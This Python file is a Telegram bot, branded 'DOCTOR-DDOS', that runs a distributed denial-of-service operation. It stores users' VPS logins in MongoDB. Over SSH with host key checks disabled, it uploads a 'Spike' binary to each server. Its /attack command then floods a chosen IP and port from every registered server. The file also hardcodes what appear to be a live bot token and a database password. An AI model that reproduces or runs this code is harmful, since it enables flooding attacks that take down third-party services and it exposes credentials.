import logging
import asyncio
from pymongo import MongoClient
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import asyncssh
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from pymongo import MongoClient
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.helpers import escape_markdown
from bson import Binary
from telegram.ext import CallbackQueryHandler

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7431527955:AAHUweIiRF2CaEVOFyICMttQyysTWc5xcz0'  # Replace with your bot token
MONGO_URI = "mongodb+srv://rmr31098:ranbal123@cluster0.pcbr2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Replace with your MongoDB URI
DB_NAME = "TEST"
VPS_COLLECTION_NAME = "vps_list"
SETTINGS_COLLECTION_NAME = "settings"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]
vps_collection = db[VPS_COLLECTION_NAME]

ADMIN_USER_ID = 5759284972 # Replace with your admin user ID
# A dictionary to track the last attack time for each user (Cooldown starts after attack completion)
last_attack_time = {}

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Define buttons for regular users
    user_keyboard = [
        [
            InlineKeyboardButton("🔧 ADD VPS", callback_data="configure_vps"),
            InlineKeyboardButton("🔧 SETUP VPS", callback_data="setup"),
        ],
        [
            InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack"),
            InlineKeyboardButton("🚀 VPS STATUS", callback_data="vps_status"),
        ]
    ]
    admin_keyboard = [
        [
            InlineKeyboardButton("🔧 ADD VPS", callback_data="configure_vps"),
            InlineKeyboardButton("🔧 SETUP VPS", callback_data="setup"),
        ],
        [
            InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack"),
            InlineKeyboardButton("🚀 VPS STATUS", callback_data="vps_status"),
        ], 
        [
            InlineKeyboardButton("⚙️ Show Settings", callback_data="show_settings"),
        ]
    ]

    # Choose the appropriate keyboard
    keyboard = admin_keyboard if user_id == ADMIN_USER_ID else user_keyboard
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Enhanced message
    message = (
        "🔥 *Welcome to the Battlefield!* 🔥\n\n"
        "⚔️ Prepare for war! Use the buttons below to begin."
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback

    if query.data == "show_settings":
        await show_settings(update, context)
    elif query.data == "start_attack":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*⚠️ Use /attack <ip> <port> <duration>*", parse_mode="Markdown")
    elif query.data == "setup":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*ℹ️ Use /setup commands to setup vps for attack.*", parse_mode="Markdown")
    elif query.data == "configure_vps":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*🔧 Use /add_vps to configure your VPS settings.*", parse_mode="Markdown")
    elif query.data == "vps_status":
        await context.bot.send_message(chat_id=query.message.chat_id, text="*🔧 Use /vps_status to she VPS.*", parse_mode="Markdown")


async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "❌ *No VPS configured!*\n"
                "Use /addvps to add your VPS details and get started."
            ),
            parse_mode="Markdown",
        )
        return

    # Extract VPS details
    ip = vps_data.get("ip", "N/A")
    username = vps_data.get("username", "N/A") 
    message = (
        "🌐 *VPS Status:*\n"
        f"🖥️ *IP Address:* `{ip}`\n"
        f"👤 *Username:* `{username}`\n\n"
        "Use /addvps to update your VPS details if needed."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')


async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')
async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    # Retrieve the current settings from MongoDB
    settings = settings_collection.find_one()  # Get the first (and only) document in the settings collection
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    # Send the settings to the user
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_vps <ip> <username> <password>*", parse_mode='Markdown')
        return

    ip, username, password = args

    # Check if the user already has a VPS entry
    existing_vps = vps_collection.find_one({"user_id": user_id})
    if existing_vps:
        message = "*♻️ Existing VPS replaced with new details!*"
    else:
        message = "*✅ New VPS added successfully!*"

    # Update or insert the VPS information
    vps_collection.update_one(
        {"user_id": user_id},
        {"$set": {"ip": ip, "username": username, "password": password}},
        upsert=True
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command for starting the attack
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is on cooldown
    current_time = time.time()
    if user_id in last_attack_time and current_time - last_attack_time[user_id] < 480:
        remaining_cooldown = 480 - (current_time - last_attack_time[user_id])
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You must wait {int(remaining_cooldown)} seconds before launching another attack.*",
            parse_mode='Markdown'
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Fetch all VPS data
    all_vps_data = vps_collection.find()

    if not all_vps_data:
        await context.bot.send_message(chat_id=chat_id, text="*❌ No VPS configured. Use /add_vps to add one!*", parse_mode='Markdown')
        return

    # Notify user that the attack is starting on all VPS
    await context.bot.send_message(
        chat_id=chat_id,
        text=(f"*⚔️ Attack Launched on all VPS! ⚔️*\n"
              f"*🎯 Target: {target_ip}:{port}*\n"
              f"*🕒 Duration: {duration} seconds*\n"
              f"*💥 Powered By DOCTOR-DDOS*"),
        parse_mode='Markdown'
    )

    # Retrieve current settings
    settings = settings_collection.find_one() or {}
    threads = settings.get("threads", 900)  # Default to 10 threads
    packet_size = settings.get("packet_size", 6)  # Default to 512 bytes

    # Run the SSH command in the background for each VPS
    for vps_data in all_vps_data:
        asyncio.create_task(run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context))

    # Update the last attack time
    last_attack_time[user_id] = current_time

# Function to run the attack on the VPS
async def run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context):
    try:
        async with asyncssh.connect(
            vps_data["ip"],
            username=vps_data["username"],
            password=vps_data["password"],
            known_hosts=None  # Disable host key checking
        ) as conn:
            # Define the attack command with the relevant parameters
            command = f"./Spike {target_ip} {port} {duration} {packet_size} {threads}"

            # Run the attack command on the VPS
            result = await conn.run(command, check=True)

            # Notify the user that the attack has completed
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*✅ Attack completed successfully!*",
                parse_mode='Markdown'
            )
    except Exception as e:
        # In case of an error during the SSH connection or attack, notify the user
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ SSH Error: {str(e)}*",
            parse_mode='Markdown'
        )

# Command for admins to upload the Spike binary
async def upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id=chat_id, text="✅ *Send the Spike binary now.*", parse_mode="Markdown")

# Handle binary file uploads
async def handle_file_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to upload files!*", parse_mode="Markdown")
        return

    document = update.message.document
    if document.file_name != "Spike":
        await context.bot.send_message(chat_id=chat_id, text="❌ *Please upload the correct file (Spike binary).*", parse_mode="Markdown")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Replace the old binary with the new one in MongoDB
    result = settings_collection.update_one(
        {"name": "binary_spike"},  # Query by a unique identifier
        {"$set": {"binary": Binary(file_content)}},  # Replace the binary content with the new one
    )

    if result.matched_count > 0:
        await context.bot.send_message(chat_id=chat_id, text="✅ *Spike binary replaced successfully.*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Failed to replace the binary. No matching document found.*", parse_mode="Markdown")

async def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No VPS configured! Add your VPS details and get started."),
            parse_mode="Markdown",
        )
        return

    # Fetch the stored Spike binary from MongoDB
    spike_binary_doc = settings_collection.find_one({"name": "binary_spike"})
    if not spike_binary_doc:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No Spike binary found! Admin must upload it first."),
            parse_mode="Markdown",
        )
        return

    spike_binary = spike_binary_doc["binary"]
    ip = vps_data.get("ip")
    username = vps_data.get("username")
    password = vps_data.get("password")

    try:
        async with asyncssh.connect(
            ip,
            username=username,
            password=password,
            known_hosts=None  # Disable host key checking
        ) as conn:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("🔄 Uploading Spike binary..."),
                parse_mode="Markdown",
            )

            # Upload the Spike binary
            async with conn.start_sftp_client() as sftp:
                async with sftp.open("Spike", "wb") as remote_file:
                    await remote_file.write(spike_binary)

            # Set permissions for the uploaded Spike binary
            await conn.run("chmod +x Spike", check=True)

            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("✅ Spike binary uploaded and permissions set successfully."),
                parse_mode="Markdown",
            )

    except asyncssh.Error as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ SSH Error: {str(e)}"),
            parse_mode="Markdown",
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ Error: {str(e)}"),
            parse_mode="Markdown",
        )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("add_vps", add_vps))
    application.add_handler(CommandHandler("vps_status", vps_status))
    application.add_handler(CommandHandler("upload", upload)) 
    application.add_handler(CommandHandler("setup", setup))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.run_polling()


if __name__ == '__main__':
    main()
